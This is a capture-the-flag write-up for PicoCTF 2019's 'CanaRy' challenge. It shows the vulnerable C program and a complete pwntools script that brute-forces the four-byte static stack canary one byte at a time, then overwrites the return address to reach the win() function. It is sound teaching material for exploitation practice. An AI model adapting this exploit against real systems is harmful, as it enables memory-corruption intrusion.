---
title: Bypassing a Static Canary
description: Exploiting a buffer overflow attack by bypassing a static canary.
---

# Buffer Overflow - Bypassing a Static Canary

## Summary

Exploiting a buffer overflow attack with a static canary.

## Challenge

### Description

!!! note ""
    Challenge : `CanaRy` from PicoCTF 2019.

This time we added a canary to detect buffer overflows. Can you still find a way to retrieve the flag from this program.

### Source code

```c linenums="1"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 32
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

## Writeup

In the source code below, the canary is load from a text file and is only four bytes, `#define CANARY_SIZE 4`.

So, we can bruteforce it. The good way to do it, it's by bruteforcing the canary one byte at a time.

!!! example
    padding + 'a' : Stack Smashing Detected -> The canary is NOT starting by the letter 'a'.<br>
    padding + 'b' : Stack Smashing Detected -> The canary is NOT starting by the letter 'b'.<br>
    ...<br>
    padding + 'o' : Ok... Now Where'''s the Flag? -> The canary is starting by the letter 'o'.<br>
    Then, you go on with : 'oa', 'ob', 'oc', ... until you get the four bytes.

Once you retrieve the whole canary, you now can jump to the *win* function.

Let's make a python script with *pwntools* to flag this challenge :

```python linenums="1"
#!/usr/bin/env python3
from string import printable
from pwn import process, p32, context, ELF

context.log_level = "error"

elf = ELF('./vuln')
win_func_addr = p32(elf.symbols['win'])
padding = 32 * "A"


def retrieve_canary():
    canary = ""

    for i in range(4):
        for c in printable.replace("\n", ""):
            p = process("./vuln")
            p.sendlineafter("Buffer?\n> ", str(len(padding + canary + c)))
            p.sendlineafter("Input> ", padding + canary + c)

            data = p.recvline()
            if not "Stack Smashing Detected" in data.decode("utf-8"):
                canary += c
                break

    return canary


if __name__ == "__main__":
    canary = retrieve_canary()
    payload = (padding + canary + "A" * 16).encode() + win_func_addr

    p = process("./vuln")
    p.sendlineafter("Buffer?\n> ", str(len(payload)))
    p.sendlineafter("Input> ", payload)
    p.interactive()
```
